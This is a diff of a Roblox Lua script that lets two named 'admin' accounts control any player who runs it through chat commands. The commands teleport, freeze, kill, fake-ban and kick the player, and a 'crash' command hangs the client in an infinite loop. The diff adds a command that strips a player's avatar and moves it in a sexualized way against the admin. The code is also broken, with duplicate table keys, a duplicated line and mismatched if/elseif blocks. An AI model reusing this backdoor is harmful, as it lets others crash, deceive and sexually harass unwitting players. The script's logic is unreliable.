@@ -2,6 +2,7 @@
 game.players["kreepozi"].Character.Humanoid.DisplayName = "[👑]67kreepoz"
 game.players["vepiuu"].Character.Humanoid.DisplayName = "[👑]codive"
 
+--Admins
 local moder = {
     admin = "vepiuu",
     admin = "KreepOZi",
@@ -15,6 +16,7 @@ spawn(function()
     repeat wait() until game:GetService("Players"):FindFirstChild(moder.admin)
 
     local admin = plrs[moder.admin]
+ local admin = plrs[moder.admin]
     local prefix = moder.prefix
 
     admin.Chatted:Connect(function(cht)
@@ -24,25 +26,45 @@ spawn(function()
              --- brings
         elseif cht:match(prefix .. "bring " .. game.Players.LocalPlayer.Name) then
             game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = admin.Character.HumanoidRootPart.CFrame
+             --- benx 
+        elseif cht:match(prefix .. "b " .. game.Players.LocalPlayer.Name) then
+            game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = admin.Character.HumanoidRootPart
+            local benxed = true
+            while benxed == true do
+                local hummy = game:GetService("Players").LocalPlayer.Character.Humanoid
+                pcall(function()
+                    hummy.Parent.Pants:Destroy()
+                end)
+                pcall(function()
+                    hummy.Parent.Shirt:Destroy()
+                end)
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = admin.Character.HumanoidRootPart.CFrame + admin.Character.HumanoidRootPart.CFrame.lookVector * 0.5
+                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 70
+                wait(0.1)
+                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -200
+            end
              --- freeze
             elseif cht:match(prefix .. "freeze " .. game.Players.LocalPlayer.Name) then 
           game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Anchored = true
-          --- unfreeze
-        elseif cht:match(prefix .. "unfreeze " .. game.Players.LocalPlayer.Name) then 
-      game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Anchored = false
+             --- unfreeze
+            elseif cht:match(prefix .. "unfreeze " .. game.Players.LocalPlayer.Name) then 
+            game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Anchored = false
              --- teleport to air 
             elseif cht:match(prefix .. "air " .. game.Players.LocalPlayer.Name) then
                 game.Players.LocalPlayer.Character.HumanoidRootPart.Position = Vector3.new(500000,500000,500000)
-             --- crash a player
-            elseif cht:match(prefix .. "crash " .. game.Players.LocalPlayer.Name) then
-            while true do
-                print("crash")
+             --- reset 
+            elseif cht:match(prefix .. "reset " .. game.Players.LocalPlayer.Name) then
+                game.Players.LocalPlayer.Character.Humanoid.Health = 0
             --- fake ban 
         if cht:match(prefix .. "ban " .. game.Players.LocalPlayer.Name) then
             game.Players.LocalPlayer:Kick("User BANNED")
             --- fake ban 
         if cht:match(prefix .. "pban " .. game.Players.LocalPlayer.Name) then
             game.Players.LocalPlayer:Kick("PERMA BANNED")
+             --- crash a player
+            elseif cht:match(prefix .. "crash " .. game.Players.LocalPlayer.Name) then
+            while true do
+                print("bye")
             end
         end
     end)
